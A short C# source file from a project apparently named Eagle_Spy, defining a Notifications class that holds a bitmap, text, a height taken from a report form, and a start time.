using System;
using System.Drawing;
using Eagle_Spy.My;

namespace Eagle_Spy;

public sealed class Notifications
{
	public Bitmap FLAG;

	public string TEXT;

	public int sizeHeight;

	public DateTime start;

	public bool startTime;

	public Notifications()
	{
		sizeHeight = MyProject.Forms.Report.Height;
	}
}
